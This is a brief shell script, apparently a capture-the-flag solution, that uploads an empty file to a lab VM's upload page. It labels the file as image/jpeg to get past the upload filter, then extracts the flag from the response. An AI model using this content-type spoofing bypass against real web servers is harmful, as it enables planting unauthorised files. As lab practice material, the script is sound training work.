#!/bin/sh

if [ -f $1 ]; then
	echo "Enter the IP of your VM"
	echo "./`basename $0` <ip>"
else
	touch /tmp/hack.dont.upload.me
	curl -s -X POST -F "uploaded=@/tmp/hack.dont.upload.me;type=image/jpeg" -F "Upload=Upload" "http://$1/index.php?page=upload" | grep 'flag' | sed -E 's|</?[^<>]*>| |g'
fi
